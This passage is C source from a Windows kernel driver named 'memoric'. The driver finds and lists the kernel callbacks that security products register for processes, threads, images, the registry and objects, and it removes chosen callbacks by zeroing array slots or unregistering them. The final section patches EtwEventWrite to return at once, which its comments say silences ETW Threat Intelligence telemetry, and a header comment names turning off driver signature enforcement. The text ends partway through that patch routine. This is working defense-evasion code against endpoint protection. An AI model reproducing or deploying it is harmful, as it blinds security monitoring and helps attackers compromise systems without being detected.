 * We use the scan approach for maximum compatibility.
 */
static PVOID FindCallbackArray(ULONG type, PULONG pMaxCount)
{
    UNICODE_STRING routineName;
    PVOID funcAddr;
    PUCHAR scan;
    ULONG i;

    /*
     * Strategy: We find a known exported function that references the array.
     * PsSetCreateProcessNotifyRoutine references PspCreateProcessNotifyRoutine.
     *
     * We scan the function body for the LEA instruction pattern:
     * 48 8D 0D xx xx xx xx    lea rcx, [rip+disp32]
     *
     * The displacement gives us the array address.
     */

    switch (type) {
    case MEMORIC_CALLBACK_PROCESS:
        RtlInitUnicodeString(&routineName, L"PsSetCreateProcessNotifyRoutine");
        break;
    case MEMORIC_CALLBACK_THREAD:
        RtlInitUnicodeString(&routineName, L"PsSetCreateThreadNotifyRoutine");
        break;
    case MEMORIC_CALLBACK_IMAGE:
        RtlInitUnicodeString(&routineName, L"PsSetLoadImageNotifyRoutine");
        break;
    default:
        return NULL;
    }

    funcAddr = MmGetSystemRoutineAddress(&routineName);
    if (!funcAddr) {
        DbgPrint("[memoric] CallbackEnum: Failed to resolve %wZ\n", &routineName);
        return NULL;
    }

    /* Scan the first 256 bytes of the function for LEA rcx pattern */
    scan = (PUCHAR)funcAddr;
    for (i = 0; i < 256; i++) {
        /* 48 8D 0D = LEA rcx, [rip+disp32] or 4C 8D 25 = LEA r12, [...] or 48 8D 3D = LEA rdi */
        if ((scan[i] == 0x48 || scan[i] == 0x4C) &&
            (scan[i+1] == 0x8D) &&
            (scan[i+2] == 0x0D || scan[i+2] == 0x25 || scan[i+2] == 0x3D || scan[i+2] == 0x05 || scan[i+2] == 0x15 || scan[i+2] == 0x35)) {

            LONG disp = *(PLONG)(&scan[i + 3]);
            PVOID arrayAddr = (PVOID)(scan + i + 7 + disp);

            /* Sanity check: must be a kernel address */
            if ((ULONG_PTR)arrayAddr > 0xFFFF000000000000ULL) {
                DbgPrint("[memoric] CallbackEnum: Found array for type %lu at %p (func=%p+0x%lX)\n",
                         type, arrayAddr, funcAddr, i);
                *pMaxCount = 64; /* max callback slots per array */
                return arrayAddr;
            }
        }
    }

    DbgPrint("[memoric] CallbackEnum: Failed to locate array for type %lu\n", type);
    return NULL;
}

/*
 * Resolve which driver owns a given kernel address by walking PsLoadedModuleList.
 */
static BOOLEAN ResolveDriverName(ULONG64 address, PCHAR outName, ULONG nameLen)
{
    PKLDR_DATA_TABLE_ENTRY entry;
    PKLDR_DATA_TABLE_ENTRY ourEntry;
    PLIST_ENTRY head, current;

    if (!g_DeviceObject || !g_DeviceObject->DriverObject)
        return FALSE;

    ourEntry = (PKLDR_DATA_TABLE_ENTRY)g_DeviceObject->DriverObject->DriverSection;
    if (!ourEntry)
        return FALSE;

    head = &ourEntry->InLoadOrderLinks;
    current = head->Flink;

    while (current != head) {
        entry = CONTAINING_RECORD(current, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        current = current->Flink;

        if (entry->DllBase && entry->SizeOfImage) {
            ULONG64 base = (ULONG64)entry->DllBase;
            ULONG64 end = base + entry->SizeOfImage;

            if (address >= base && address < end) {
                /* Convert UNICODE BaseDllName to ANSI (truncated) */
                ULONG copyLen = entry->BaseDllName.Length / sizeof(WCHAR);
                ULONG j;
                if (copyLen >= nameLen) copyLen = nameLen - 1;
                for (j = 0; j < copyLen; j++) {
                    outName[j] = (CHAR)entry->BaseDllName.Buffer[j];
                }
                outName[copyLen] = '\0';
                return TRUE;
            }
        }
    }

    return FALSE;
}

/*
 * Enumerate Registry callbacks (CmRegisterCallbackEx).
 * Registry callbacks are stored in a linked list rooted at
 * nt!CallbackListHead (or CmpCallBackVector in older builds).
 * We find it by scanning CmRegisterCallback/CmUnRegisterCallback.
 *
 * Each node is a CM_CALLBACK_CONTEXT_BLOCK:
 *   +0x00: LIST_ENTRY  CallbackList
 *   +0x10: ULONG64     Function (the callback routine)
 *   +0x18: LARGE_INTEGER Cookie
 *   +0x20: PVOID       CallerContext
 *   +0x28: UNICODE_STRING Altitude
 *
 * Some builds use different offsets; we probe to verify.
 */

/*
 * FindRegistryCallbackList — discover CmpCallBackList head by registering
 * our own temporary callback via CmRegisterCallbackEx, then searching the
 * kernel's linked list for the node that contains our function pointer.
 *
 * This avoids instruction-stream disassembly of CmRegisterCallbackEx and
 * produces the exact list head address on any Windows version that supports
 * the CmRegisterCallback API.
 */
static PVOID g_CmpCallBackListHead = NULL;
static ULONG g_RegCallbackFunctionOffset = 0; /* calibrated offset of Function in CM_CALLBACK_CONTEXT_BLOCK */
static ULONG g_RegCallbackCookieOffset   = 0; /* calibrated offset of Cookie in CM_CALLBACK_CONTEXT_BLOCK */

static NTSTATUS __stdcall RegistryProbeCallback(
    PVOID CallbackContext,
    PVOID Argument1,
    PVOID Argument2)
{
    UNREFERENCED_PARAMETER(CallbackContext);
    UNREFERENCED_PARAMETER(Argument1);
    UNREFERENCED_PARAMETER(Argument2);
    return STATUS_SUCCESS;
}

static PVOID FindRegistryCallbackList(void)
{
    LARGE_INTEGER cookie = { 0 };
    NTSTATUS st;

    if (g_CmpCallBackListHead)
        return g_CmpCallBackListHead;

    /*
     * Register a probe callback. CmRegisterCallbackEx inserts a
     * CM_CALLBACK_CONTEXT_BLOCK into CmpCallBackList. The block contains
     * our function pointer at some offset. We then scan ntoskrnl .data
     * for a LIST_ENTRY chain that leads to a node containing our pointer.
     */
    UNICODE_STRING altitude;
    RtlInitUnicodeString(&altitude, L"999999");
    st = CmRegisterCallbackEx(RegistryProbeCallback, &altitude, NULL,
                              NULL, &cookie, NULL);
    if (!NT_SUCCESS(st)) {
        /* Fallback: try CmRegisterCallback (older) */
        st = CmRegisterCallback(RegistryProbeCallback, NULL, &cookie);
    }
    if (!NT_SUCCESS(st)) return NULL;

    /*
     * Now walk from the inserted node backwards to find the list head.
     * The list head lives in ntoskrnl .data section; all nodes are pool
     * allocations. The head is the only node that sits in .data (its address
     * is within ntoskrnl image range).
     *
     * Strategy: find ntoskrnl base+size, then walk the Flink chain. The
     * entry whose address falls within ntoskrnl is the list head.
     */
    {
        PVOID ntBase = NULL;
        ULONG ntSize = 0;
        PVOID foundHead = NULL;

        /* Get ntoskrnl range via FindKernelModule or heuristic */
        {
            PVOID sysInfo = NULL;
            ULONG retLen = 8192;
            do {
                if (sysInfo) ExFreePoolWithTag(sysInfo, 'cpmM');
                sysInfo = ExAllocatePool2(POOL_FLAG_NON_PAGED, retLen, 'cpmM');
                if (!sysInfo) break;
                st = ZwQuerySystemInformation(11, sysInfo, retLen, &retLen);
            } while (st == STATUS_INFO_LENGTH_MISMATCH && retLen < 16 * 1024 * 1024);

            if (NT_SUCCESS(st) && sysInfo) {
                PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)sysInfo;
                if (modules->NumberOfModules > 0) {
                    ntBase = modules->Modules[0].ImageBase;
                    ntSize = modules->Modules[0].ImageSize;
                }
            }
            if (sysInfo) ExFreePoolWithTag(sysInfo, 'cpmM');
        }

        if (ntBase && ntSize > 0) {
            ULONG_PTR ntStart = (ULONG_PTR)ntBase;
            ULONG_PTR ntEnd = ntStart + ntSize;

            /*
             * We need to find our probe callback's node.
             * Scan ntoskrnl .data for LIST_ENTRY whose chain contains a node
             * with our RegistryProbeCallback function pointer.
             */
            PIMAGE_NT_HEADERS ntHdr = RtlImageNtHeader(ntBase);
            if (ntHdr) {
                PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
                USHORT s;
                for (s = 0; s < ntHdr->FileHeader.NumberOfSections; s++) {
                    if (sec[s].Name[0] == '.' && sec[s].Name[1] == 'd' &&
                        sec[s].Name[2] == 'a' && sec[s].Name[3] == 't') {
                        PUCHAR dataStart = (PUCHAR)ntBase + sec[s].VirtualAddress;
                        PUCHAR dataEnd = dataStart + sec[s].Misc.VirtualSize - sizeof(LIST_ENTRY);
                        PUCHAR scan;

                        for (scan = dataStart; scan < dataEnd && !foundHead; scan += sizeof(ULONG_PTR)) {
                            __try {
                                PLIST_ENTRY candidate = (PLIST_ENTRY)scan;
                                /* Must be a valid LIST_ENTRY with kernel pointers */
                                if ((ULONG_PTR)candidate->Flink < 0xFFFF000000000000ULL ||
                                    (ULONG_PTR)candidate->Blink < 0xFFFF000000000000ULL)
                                    continue;

                                /* Walk chain looking for our callback pointer */
                                PLIST_ENTRY entry = candidate->Flink;
                                ULONG safety = 0;
                                while (entry != candidate && safety < 256) {
                                    /*
                                     * Scan the CM_CALLBACK_CONTEXT_BLOCK for our probe
                                     * function pointer at candidate offsets +0x10..+0x40.
                                     * When found, also locate the cookie value nearby to
                                     * calibrate both Function and Cookie offsets.
                                     */
                                    ULONG probe;
                                    for (probe = 0x10; probe <= 0x40; probe += 0x08) {
                                        ULONG64 val = *(PULONG64)((PUCHAR)entry + probe);
                                        if (val == (ULONG64)(ULONG_PTR)RegistryProbeCallback) {
                                            g_RegCallbackFunctionOffset = probe;
                                            foundHead = candidate;
                                            /* Find cookie: scan nearby for our known cookie value */
                                            {
                                                ULONG cprobe;
                                                for (cprobe = 0x10; cprobe <= 0x40; cprobe += 0x08) {
                                                    if (cprobe == probe) continue;
                                                    ULONG64 cval = *(PULONG64)((PUCHAR)entry + cprobe);
                                                    if (cval == (ULONG64)cookie.QuadPart) {
                                                        g_RegCallbackCookieOffset = cprobe;
                                                        break;
                                                    }
                                                }
                                            }
                                            DbgPrint("[memoric] Registry: Calibrated Function=+0x%X, Cookie=+0x%X\n",
                                                     g_RegCallbackFunctionOffset, g_RegCallbackCookieOffset);
                                            break;
                                        }
                                    }
                                    if (foundHead) break;
                                    entry = entry->Flink;
                                    safety++;
                                }
                            } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
                        }
                        break; /* only first .data */
                    }
                }
            }
        }

        /* Unregister our probe before returning */
        CmUnRegisterCallback(cookie);

        if (foundHead) {
            g_CmpCallBackListHead = foundHead;
            DbgPrint("[memoric] CallbackEnum: Found CmpCallBackList at %p (self-register calibration)\n",
                     foundHead);
        }
        return foundHead;
    }
}

/*
 * Enumerate Object callbacks (ObRegisterCallbacks).
 * Object callbacks are attached to OBJECT_TYPE structures.
 * The CallbackList is at OBJECT_TYPE.CallbackList (LIST_ENTRY).
 *
 * We discover the CallbackList offset dynamically by registering our own
 * dummy callback via ObRegisterCallbacks, locating our entry in the
 * OBJECT_TYPE structure, and then using the calibrated offset to enumerate
 * all registered object callbacks.
 *
 * For each callback entry we also discover the layout of
 * OB_CALLBACK_ENTRY so we can extract:
 *   - PreOperation / PostOperation function pointers
 *   - Registration handle (for ObUnRegisterCallbacks-based removal)
 */
static ULONG g_ObjectTypeCallbackListOffset = 0;  /* cached once discovered */
static ULONG g_ObCallbackPreOpOffset  = 0;
static ULONG g_ObCallbackPostOpOffset = 0;
static ULONG g_ObCallbackHandleOffset = 0; /* offset of registration handle in callback entry */

/* Dummy pre-operation callback for calibration */
static OB_PREOP_CALLBACK_STATUS ObjectProbePreOp(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OpInfo)
{
    UNREFERENCED_PARAMETER(RegistrationContext);
    UNREFERENCED_PARAMETER(OpInfo);
    return OB_PREOP_SUCCESS;
}

static BOOLEAN CalibrateObjectCallbackOffsets(void)
{
    NTSTATUS st;
    OB_CALLBACK_REGISTRATION cbReg;
    OB_OPERATION_REGISTRATION opReg;
    PVOID regHandle = NULL;
    POBJECT_TYPE procType = *PsProcessType;

    if (g_ObjectTypeCallbackListOffset != 0 && g_ObCallbackPreOpOffset != 0)
        return TRUE; /* already calibrated */

    /* Register a probe callback on PsProcessType */
    RtlZeroMemory(&cbReg, sizeof(cbReg));
    RtlZeroMemory(&opReg, sizeof(opReg));

    cbReg.Version                = OB_FLT_REGISTRATION_VERSION;
    cbReg.OperationRegistrationCount = 1;
    cbReg.OperationRegistration  = &opReg;

    opReg.ObjectType             = PsProcessType;
    opReg.Operations             = OB_OPERATION_HANDLE_CREATE;
    opReg.PreOperation           = ObjectProbePreOp;
    opReg.PostOperation          = NULL;

    st = ObRegisterCallbacks(&cbReg, &regHandle);
    if (!NT_SUCCESS(st) || !regHandle) return FALSE;

    /*
     * Now scan OBJECT_TYPE for a LIST_ENTRY whose chain contains a node
     * with our ObjectProbePreOp function pointer. This discovers:
     *   1. CallbackList offset in OBJECT_TYPE
     *   2. PreOperation offset in OB_CALLBACK_ENTRY
     */
    {
        ULONG off;
        BOOLEAN found = FALSE;

        for (off = 0x80; off <= 0x100 && !found; off += sizeof(ULONG_PTR)) {
            __try {
                PLIST_ENTRY candidate = (PLIST_ENTRY)((PUCHAR)procType + off);
                if ((ULONG_PTR)candidate->Flink < 0xFFFF000000000000ULL ||
                    (ULONG_PTR)candidate->Blink < 0xFFFF000000000000ULL ||
                    candidate->Flink == candidate)
                    continue;

                /* Walk chain for our callback */
                PLIST_ENTRY entry = candidate->Flink;
                ULONG safety = 0;
                while (entry != candidate && safety < 64) {
                    /* Scan entry for our function pointer */
                    ULONG foff;
                    for (foff = 0x10; foff <= 0x40; foff += 0x08) {
                        ULONG64 val = *(PULONG64)((PUCHAR)entry + foff);
                        if (val == (ULONG64)(ULONG_PTR)ObjectProbePreOp) {
                            g_ObjectTypeCallbackListOffset = off;
                            g_ObCallbackPreOpOffset = foff;
                            /* PostOperation is typically the next pointer */
                            g_ObCallbackPostOpOffset = foff + 0x08;

                            /* Find registration handle by searching for regHandle value */
                            ULONG hoff;
                            for (hoff = 0x10; hoff <= 0x48; hoff += 0x08) {
                                if (hoff == foff || hoff == foff + 0x08) continue;
                                ULONG64 hval = *(PULONG64)((PUCHAR)entry + hoff);
                                if (hval == (ULONG64)(ULONG_PTR)regHandle) {
                                    g_ObCallbackHandleOffset = hoff;
                                    break;
                                }
                            }
                            found = TRUE;
                            break;
                        }
                    }
                    entry = entry->Flink;
                    safety++;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
        }

        /* Unregister our probe */
        ObUnRegisterCallbacks(regHandle);

        if (found) {
            DbgPrint("[memoric] ObjectCallback: Calibrated CallbackList offset=0x%lX, "
                     "PreOp=+0x%lX, PostOp=+0x%lX, Handle=+0x%lX\n",
                     g_ObjectTypeCallbackListOffset,
                     g_ObCallbackPreOpOffset, g_ObCallbackPostOpOffset,
                     g_ObCallbackHandleOffset);
            return TRUE;
        }
    }

    return FALSE;
}

static ULONG EnumObjectCallbacks(
    PMEMORIC_CALLBACK_ENTRY entries,
    ULONG maxEntries,
    ULONG startIndex)
{
    ULONG count = 0;
    ULONG typeIdx;
    POBJECT_TYPE objectTypes[2];

    if (!CalibrateObjectCallbackOffsets())
        return 0;

    objectTypes[0] = *PsProcessType;
    objectTypes[1] = *PsThreadType;

    for (typeIdx = 0; typeIdx < 2 && count < maxEntries; typeIdx++) {
        POBJECT_TYPE objType = objectTypes[typeIdx];
        PLIST_ENTRY callbackList;
        PLIST_ENTRY entry;
        ULONG safety;

        if (!objType) continue;

        callbackList = (PLIST_ENTRY)((PUCHAR)objType + g_ObjectTypeCallbackListOffset);

        __try {
            if ((ULONG_PTR)callbackList->Flink < 0xFFFF000000000000ULL ||
                callbackList->Flink == callbackList)
                continue;
        } __except (EXCEPTION_EXECUTE_HANDLER) { continue; }

        entry = callbackList->Flink;
        safety = 0;
        while (entry != callbackList && safety < 256 && count < maxEntries) {
            __try {
                ULONG64 preOp = *(PULONG64)((PUCHAR)entry + g_ObCallbackPreOpOffset);
                ULONG64 postOp = *(PULONG64)((PUCHAR)entry + g_ObCallbackPostOpOffset);

                /* Report PreOperation if valid */
                if (preOp > 0xFFFF800000000000ULL && preOp < 0xFFFFFFFFFFFFFFF0ULL) {
                    entries[count].CallbackAddress = preOp;
                    entries[count].Index = startIndex + count;
                    entries[count].Type = MEMORIC_CALLBACK_OBJECT;
                    entries[count].Cookie = (ULONG64)(ULONG_PTR)entry;
                    ResolveDriverName(preOp, entries[count].DriverName,
                                    sizeof(entries[count].DriverName));
                    count++;
                }

                /* Report PostOperation if valid and different */
                if (count < maxEntries &&
                    postOp > 0xFFFF800000000000ULL && postOp < 0xFFFFFFFFFFFFFFF0ULL &&
                    postOp != preOp) {
                    entries[count].CallbackAddress = postOp;
                    entries[count].Index = startIndex + count;
                    entries[count].Type = MEMORIC_CALLBACK_OBJECT;
                    entries[count].Cookie = (ULONG64)(ULONG_PTR)entry;
                    ResolveDriverName(postOp, entries[count].DriverName,
                                    sizeof(entries[count].DriverName));
                    count++;
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { }

            entry = entry->Flink;
            safety++;
        }
    }

    return count;
}

static NTSTATUS HandleCallbackEnum(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    MEMORIC_CALLBACK_ENUM_REQUEST reqCopy;
    PMEMORIC_CALLBACK_ENTRY entries;
    ULONG maxEntries, count = 0;

    if (InputLength < sizeof(MEMORIC_CALLBACK_ENUM_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, SystemBuffer, sizeof(MEMORIC_CALLBACK_ENUM_REQUEST));

    if (reqCopy.CallbackType > MEMORIC_CALLBACK_OBJECT)
        return STATUS_INVALID_PARAMETER;

    maxEntries = reqCopy.MaxEntries > 0 ? reqCopy.MaxEntries : 64;

    if (OutputLength < sizeof(MEMORIC_CALLBACK_ENTRY))
        return STATUS_BUFFER_TOO_SMALL;

    {
        ULONG maxByBuffer = OutputLength / sizeof(MEMORIC_CALLBACK_ENTRY);
        if (maxEntries > maxByBuffer)
            maxEntries = maxByBuffer;
    }

    entries = (PMEMORIC_CALLBACK_ENTRY)SystemBuffer;
    RtlZeroMemory(entries, maxEntries * sizeof(MEMORIC_CALLBACK_ENTRY));

    if (reqCopy.CallbackType <= MEMORIC_CALLBACK_IMAGE) {
        /* Ps* callback types: use existing array scan */
        PVOID arrayBase;
        ULONG maxSlots = 0;
        ULONG i;

        arrayBase = FindCallbackArray(reqCopy.CallbackType, &maxSlots);
        if (!arrayBase)
            return STATUS_UNSUCCESSFUL;

        for (i = 0; i < maxSlots && count < maxEntries; i++) {
            ULONG_PTR slot;

            __try {
                slot = ((PULONG_PTR)arrayBase)[i];
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                break;
            }

            if (slot == 0) continue;
            slot &= ~0xFULL;
            if (slot < 0xFFFF000000000000ULL) continue;

            /*
             * EX_CALLBACK_ROUTINE_BLOCK layout:
             *   +0x00  EX_RUNDOWN_REF  RundownProtect
             *   +0x08  PEX_CALLBACK_FUNCTION  Function
             *   +0x10  PVOID           Context
             *
             * The Function field at +0x08 is the real callback routine.
             * This layout has been stable from Windows 7 through Windows 11 24H2.
             * We verify by checking the value is a valid kernel function pointer.
             */
            {
                ULONG64 routineAddr;
                __try {
                    routineAddr = *(PULONG64)(slot + 0x08);
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    continue;
                }

                if (routineAddr < 0xFFFF000000000000ULL) continue;

                entries[count].CallbackAddress = routineAddr;
                entries[count].Index = i;
                entries[count].Type = reqCopy.CallbackType;
                ResolveDriverName(routineAddr, entries[count].DriverName,
                                sizeof(entries[count].DriverName));
                count++;
            }
        }
    }
    else if (reqCopy.CallbackType == MEMORIC_CALLBACK_REGISTRY) {
        /*
         * Registry callbacks: Walk CmpCallBackList linked list.
         * Each entry is a CM_CALLBACK_CONTEXT_BLOCK with the callback routine
         * and registration cookie.
         */
        PLIST_ENTRY listHead = (PLIST_ENTRY)FindRegistryCallbackList();
        if (!listHead) {
            *BytesReturned = 0;
            return STATUS_UNSUCCESSFUL;
        }

        {
            PLIST_ENTRY entry = listHead->Flink;
            ULONG safety = 0;
            while (entry != listHead && safety < 256 && count < maxEntries) {
                __try {
                    /*
                     * CM_CALLBACK_CONTEXT_BLOCK layout (calibrated dynamically):
                     *   +0x00: LIST_ENTRY Link
                     *   +g_RegCallbackFunctionOffset: PEX_CALLBACK_FUNCTION
                     *   +g_RegCallbackCookieOffset:   LARGE_INTEGER Cookie
                     *
                     * Offsets are discovered via FindRegistryCallbackList
                     * self-registration calibration. Fallback to +0x10/+0x18
                     * if calibration didn't run or failed.
                     */
                    ULONG funcOff = g_RegCallbackFunctionOffset ? g_RegCallbackFunctionOffset : 0x10;
                    ULONG cookieOff = g_RegCallbackCookieOffset ? g_RegCallbackCookieOffset : 0x18;
                    ULONG64 funcAddr = *(PULONG64)((PUCHAR)entry + funcOff);
                    ULONG64 regCookie = *(PULONG64)((PUCHAR)entry + cookieOff);

                    if (funcAddr > 0xFFFF800000000000ULL && funcAddr < 0xFFFFFFFFFFFFFFF0ULL) {
                        entries[count].CallbackAddress = funcAddr;
                        entries[count].Index = count;
                        entries[count].Type = MEMORIC_CALLBACK_REGISTRY;
                        entries[count].Cookie = regCookie;
                        ResolveDriverName(funcAddr, entries[count].DriverName,
                                        sizeof(entries[count].DriverName));
                        count++;
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) { break; }

                entry = entry->Flink;
                safety++;
            }
        }
    }
    else if (reqCopy.CallbackType == MEMORIC_CALLBACK_OBJECT) {
        /* Object callbacks: Walk OBJECT_TYPE.CallbackList for PsProcessType/PsThreadType */
        count = EnumObjectCallbacks(entries, maxEntries, 0);
    }

    *BytesReturned = count * sizeof(MEMORIC_CALLBACK_ENTRY);
    DbgPrint("[memoric] CallbackEnum: type=%lu, found %lu callbacks\n",
             reqCopy.CallbackType, count);
    return STATUS_SUCCESS;
}

/* ================================================================
 * Callback Remove - neutralize a specific callback
 *
 * We zero the slot in the callback array, effectively
 * preventing the callback from being invoked.
 * ================================================================ */

static NTSTATUS HandleCallbackRemove(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_CALLBACK_REMOVE_REQUEST req;

    UNREFERENCED_PARAMETER(OutputLength);

    if (InputLength < sizeof(MEMORIC_CALLBACK_REMOVE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_CALLBACK_REMOVE_REQUEST)SystemBuffer;

    if (req->CallbackType > MEMORIC_CALLBACK_OBJECT)
        return STATUS_NOT_IMPLEMENTED;

    if (req->CallbackType <= MEMORIC_CALLBACK_IMAGE) {
        /* Ps* callback types: zero the array slot */
        PVOID arrayBase;
        ULONG maxSlots = 0;
        ULONG_PTR slot;
        ULONG64 routineAddr;
        KIRQL oldIrql;

        arrayBase = FindCallbackArray(req->CallbackType, &maxSlots);
        if (!arrayBase)
            return STATUS_UNSUCCESSFUL;

        if (req->Index >= maxSlots)
            return STATUS_INVALID_PARAMETER;

        __try {
            slot = ((PULONG_PTR)arrayBase)[req->Index];
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return STATUS_ACCESS_VIOLATION;
        }

        if (slot == 0)
            return STATUS_NOT_FOUND;

        slot &= ~0xFULL;

        __try {
            routineAddr = *(PULONG64)(slot + 0x08);
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return STATUS_ACCESS_VIOLATION;
        }

        if (req->CallbackAddress != 0 && routineAddr != req->CallbackAddress) {
            DbgPrint("[memoric] CallbackRemove: Address mismatch at index %lu: expected 0x%llX, got 0x%llX\n",
                     req->Index, req->CallbackAddress, routineAddr);
            return STATUS_INVALID_PARAMETER;
        }

        KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);
        __try {
            ((PULONG_PTR)arrayBase)[req->Index] = 0;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            KeLowerIrql(oldIrql);
            return GetExceptionCode();
        }
        KeLowerIrql(oldIrql);

        DbgPrint("[memoric] CallbackRemove: Removed Ps* type=%lu index=%lu (was 0x%llX)\n",
                 req->CallbackType, req->Index, routineAddr);
    }
    else if (req->CallbackType == MEMORIC_CALLBACK_REGISTRY) {
        /*
         * Registry callback removal via CmUnRegisterCallback.
         * The Cookie was populated during enumeration.
         * This is the official API — no memory corruption needed.
         */
        NTSTATUS status;
        LARGE_INTEGER cookie;

        if (req->Cookie == 0)
            return STATUS_INVALID_PARAMETER;

        cookie.QuadPart = (LONGLONG)req->Cookie;
        status = CmUnRegisterCallback(cookie);

        if (!NT_SUCCESS(status)) {
            DbgPrint("[memoric] CallbackRemove: CmUnRegisterCallback(0x%llX) failed: 0x%08lX\n",
                     req->Cookie, status);
            return status;
        }

        DbgPrint("[memoric] CallbackRemove: Unregistered registry callback cookie=0x%llX\n",
                 req->Cookie);
    }
    else if (req->CallbackType == MEMORIC_CALLBACK_OBJECT) {
        /*
         * Object callback removal via ObUnRegisterCallbacks.
         * During calibration we discovered g_ObCallbackHandleOffset — the offset
         * within an OB_CALLBACK_ENTRY where the registration handle is stored.
         * We extract the handle from the callback entry and use the documented API.
         * If handle offset is unknown, fall back to direct unlink.
         */
        PLIST_ENTRY target;

        if (req->Cookie == 0)
            return STATUS_INVALID_PARAMETER;

        target = (PLIST_ENTRY)(ULONG_PTR)req->Cookie;

        /* Validate the target is still a valid linked list entry */
        __try {
            if ((ULONG_PTR)target->Flink < 0xFFFF000000000000ULL ||
                (ULONG_PTR)target->Blink < 0xFFFF000000000000ULL) {
                return STATUS_INVALID_ADDRESS;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return STATUS_ACCESS_VIOLATION;
        }

        if (g_ObCallbackHandleOffset != 0) {
            /* Extract registration handle and use documented API */
            PVOID regHandle = NULL;
            __try {
                regHandle = *(PVOID *)((PUCHAR)target + g_ObCallbackHandleOffset);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                return STATUS_ACCESS_VIOLATION;
            }

            if (regHandle) {
                ObUnRegisterCallbacks(regHandle);
                DbgPrint("[memoric] CallbackRemove: ObUnRegisterCallbacks(%p) for entry %p\n",
                         regHandle, target);
            } else {
                return STATUS_INVALID_PARAMETER;
            }
        } else {
            /*
             * Handle offset unknown — attempt re-calibration before giving up.
             * This handles the case where the driver was just loaded and
             * CalibrateObjectCallbackOffsets hasn't run yet, or the first
             * calibration missed the handle offset.
             */
            DbgPrint("[memoric] CallbackRemove: Handle offset not calibrated — attempting re-calibration\n");

            /* Force re-calibration by clearing cached offsets */
            g_ObjectTypeCallbackListOffset = 0;
            g_ObCallbackPreOpOffset = 0;
            g_ObCallbackPostOpOffset = 0;
            g_ObCallbackHandleOffset = 0;

            if (CalibrateObjectCallbackOffsets() && g_ObCallbackHandleOffset != 0) {
                /* Retry extraction with newly calibrated offset */
                PVOID regHandle2 = NULL;
                __try {
                    regHandle2 = *(PVOID *)((PUCHAR)target + g_ObCallbackHandleOffset);
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    return STATUS_ACCESS_VIOLATION;
                }

                if (regHandle2) {
                    ObUnRegisterCallbacks(regHandle2);
                    DbgPrint("[memoric] CallbackRemove: ObUnRegisterCallbacks(%p) after re-calibration\n",
                             regHandle2);
                } else {
                    return STATUS_INVALID_PARAMETER;
                }
            } else {
                DbgPrint("[memoric] CallbackRemove: Cannot remove object callback at %p — "
                         "handle offset not calibrated after retry\n", target);
                return STATUS_NOT_SUPPORTED;
            }
        }
    }

    *BytesReturned = 0;
    return STATUS_SUCCESS;
}

/* ================================================================
 * Kernel Patching - targeted patches for specific subsystems
 *
 * Patch Type 0 (ETW-TI): Patches EtwTiLogXxx functions to return early
 * Patch Type 1 (DSE): Patches ci.dll!g_CiOptions to disable enforcement
 * ================================================================ */

static NTSTATUS HandlePatchKernel(
    PVOID SystemBuffer,
    ULONG InputLength,
    ULONG OutputLength,
    PULONG BytesReturned)
{
    PMEMORIC_PATCH_REQUEST req;
    UNICODE_STRING funcName;
    PVOID funcAddr;
    KIRQL oldIrql;
    ULONG_PTR cr0;

    UNREFERENCED_PARAMETER(OutputLength);

    if (InputLength < sizeof(MEMORIC_PATCH_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;

    req = (PMEMORIC_PATCH_REQUEST)SystemBuffer;

    switch (req->PatchType) {
    case MEMORIC_PATCH_ETW_TI: {
        /*
         * Patch EtwEventWrite to return STATUS_SUCCESS immediately.
         * This silences all ETW-based telemetry including Threat Intelligence.
         *
         * We patch the first two bytes:
         *   xor eax, eax    (0x33 0xC0)
         *   ret              (0xC3)
         */
        static UCHAR savedEtwBytes[4] = { 0 };
        static BOOLEAN etwSaved = FALSE;

        UCHAR patchBytes[] = { 0x33, 0xC0, 0xC3 }; /* xor eax,eax; ret */

        /* Find EtwEventWrite */
        RtlInitUnicodeString(&funcName, L"EtwEventWrite");
        funcAddr = MmGetSystemRoutineAddress(&funcName);
        if (!funcAddr) {
            DbgPrint("[memoric] PatchKernel: EtwEventWrite not found\n");
            return STATUS_NOT_FOUND;
        }

        KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);
        cr0 = __readcr0();
        __writecr0(cr0 & ~(1ULL << 16)); /* clear WP */

        if (req->Enable == 0) {
            /* Patch: save original bytes first */
            if (!etwSaved) {
                __try {
                    RtlCopyMemory(savedEtwBytes, funcAddr, sizeof(patchBytes));
                    etwSaved = TRUE;
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    __writecr0(cr0);
                    KeLowerIrql(oldIrql);
                    return GetExceptionCode();
                }
            }

            __try {
                RtlCopyMemory(funcAddr, patchBytes, sizeof(patchBytes));
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                __writecr0(cr0);
                KeLowerIrql(oldIrql);
                return GetExceptionCode();
            }

            DbgPrint("[memoric] PatchKernel: EtwEventWrite patched (ETW-TI disabled)\n");
        } else {
            /* Restore */
            if (etwSaved) {
                __try {
                    RtlCopyMemory(funcAddr, savedEtwBytes, sizeof(patchBytes));
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    __writecr0(cr0);
                    KeLowerIrql(oldIrql);
                    return GetExceptionCode();
                }
                DbgPrint("[memoric] PatchKernel: EtwEventWrite restored\n");
            }
        }

